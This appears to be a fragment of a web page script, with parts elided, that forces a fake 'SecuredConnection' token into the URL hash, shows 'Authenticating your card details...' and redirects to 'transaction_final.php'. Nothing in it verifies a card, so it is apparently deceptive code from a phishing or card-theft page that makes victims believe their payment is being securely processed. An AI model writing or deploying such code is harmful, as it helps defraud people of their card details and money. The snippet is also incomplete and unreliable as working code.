...
window.onhashchange=function(){window.location.hash="1005403956476747382&&id_setvalue00023rrsdEFdSecuredConnection%weewhf45482";}
...
function Redirect()
{
    window.location="transaction_final.php";
}

document.write("Authenticating your card details...");
